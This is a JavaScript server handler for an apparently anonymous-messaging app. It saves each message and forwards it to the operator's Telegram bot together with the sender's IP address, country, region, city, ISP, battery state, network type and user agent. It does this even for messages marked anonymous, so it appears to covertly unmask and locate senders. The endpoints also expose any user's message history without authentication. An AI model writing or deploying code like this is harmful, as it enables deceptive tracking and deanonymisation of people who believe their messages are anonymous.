// ===== SEND/MESSAGE API =====
const { readDB, writeDB, getBDTime, genId, invalidateCache } = require('./database');
const { sendTelegramMessage, sendReplyButton } = require('../bot/webhook');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const db = await readDB();

    if (req.method === 'GET') {
      const { action, userId } = req.query;

      if (action === 'history') {
        const msgs = (db.messages || []).filter(m => m.userId === userId);
        const formatted = msgs.map((m, i) => ({
          ...m,
          msgId: String(i + 1).padStart(3, '0')
        }));
        return res.json({ messages: formatted });
      }

      if (action === 'received') {
        const replies = (db.replies || []).filter(r => r.targetUserId === userId && !r.deleted);
        const formatted = replies.map((r, i) => ({
          ...r,
          msgId: String(i + 1).padStart(3, '0')
        }));
        // Update receive count
        if (db.users[userId]) {
          db.users[userId].totalReceived = formatted.length;
          await writeDB(db);
        }
        return res.json({ messages: formatted });
      }

      if (action === 'pendingPopups') {
        // Find newest unseen reply for this user
        const unseen = (db.replies || []).filter(r => r.targetUserId === userId && !r.deleted);
        const newest = unseen.length > 0 ? unseen[unseen.length - 1] : null;

        // Broadcast
        const broadcast = db.broadcast || null;

        // New caption
        const newCap = db.newCaption || null;

        return res.json({
          replies: newest ? [newest] : [],
          broadcast,
          newCaption: newCap
        });
      }

      if (action === 'seen') {
        return res.json({ ok: true });
      }

      return res.json({ ok: true });
    }

    if (req.method === 'POST') {
      const { action, userId, message, name, wa, fb, anonymous, deviceInfo, msgId } = req.body;

      if (action === 'seen') {
        // Report seen to bot
        const reply = (db.replies || []).find(r => r.id === msgId && r.targetUserId === userId);
        if (reply && !reply.seenAt) {
          reply.seenAt = getBDTime();
          await writeDB(db);
          const seenMsg =
`╔══════════════════════╗
👁️ MESSAGE SEEN REPORT
╚══════════════════════╝

🆔 UserID : ${userId}

📤 Reply Time : ${reply.time}

👁️ Seen Time : ${getBDTime()}

✅ User Seen Your Message`;
          await sendTelegramMessage(seenMsg);
        }
        return res.json({ ok: true });
      }

      // Default: send new message
      if (!message) return res.status(400).json({ error: 'Message required' });

      const now = getBDTime();
      const di = deviceInfo || {};
      const msgRecord = {
        id: genId(), userId, message, time: now,
        name: name || 'Unknown User', wa: wa || 'Not Provided', fb: fb || 'Not Added',
        anonymous: !!anonymous
      };
      db.messages = db.messages || [];
      db.messages.push(msgRecord);

      if (db.users[userId]) {
        db.users[userId].totalSent = (db.users[userId].totalSent || 0) + 1;
        db.users[userId].lastActive = now;
        db.users[userId].lastMessage = message.substring(0, 50);
      }

      await writeDB(db);
      invalidateCache();

      // Send to Telegram bot
      const botMsg =
`╔══════════════════════════════╗
🔰 𝗡𝗲𝘄 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱 🔰
╚══════════════════════════════╝

🕒 𝗦𝗲𝗻𝗱 𝗧𝗶𝗺𝗲 & 𝗗𝗮𝘁𝗲 : ${now}

🆔 𝗨𝘀𝗲𝗿 𝗜𝗗 : ${userId}

👤 𝗨𝘀𝗲𝗿 𝗡𝗮𝗺𝗲 : ${name || 'Unknown User'}

📱 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗻𝗳𝗼 : ${di.platform || 'Unknown'}

📲 𝗗𝗲𝘃𝗶𝗰𝗲 𝗠𝗼𝗱𝗲𝗹 : ${di.userAgent?.includes('Mobile') ? 'Mobile' : 'Desktop'}

🔋 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 𝗦𝘁𝗮𝘁𝘂𝘀 : ${di.charging || 'Unknown'} ${di.batteryLevel || ''}

📶 𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼 : ${di.networkType || 'Unknown'}

🌍 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 : ${di.ip || 'Unknown'}

🏳️ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : ${di.country || 'Unknown'}

🏠 𝗗𝗶𝘃𝗶𝘀𝗶𝗼𝗻 : ${di.region || 'Unknown'}

📍 𝗭𝗶𝗹𝗹𝗮 : ${di.region || 'Unknown'}

🏡 𝗖𝗶𝘁𝘆 / 𝗩𝗶𝗹𝗹𝗮𝗴𝗲 : ${di.city || 'Unknown'}

📡 𝗜𝗦𝗣 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗿 : ${di.isp || 'Unknown'}

💾 𝗥𝗔𝗠 / 𝗥𝗢𝗠 : ${di.deviceMemory ? di.deviceMemory + 'GB' : 'Unknown'} / Unknown

🧠 𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁 :
${di.userAgent || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━
💌 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 :

${message}
━━━━━━━━━━━━━━━━━━━━━━━

🔘 Reply করার জন্য নিচের "Send Reply" Button ব্যবহার করুন।`;

      await sendReplyButton(botMsg, userId, msgRecord.id);

      return res.json({ success: true, msgId: msgRecord.id });
    }

    res.status(405).json({ error: 'Method not allowed' });
  } catch (e) {
    console.error('Send API Error:', e);
    res.status(500).json({ error: 'Server error' });
  }
};
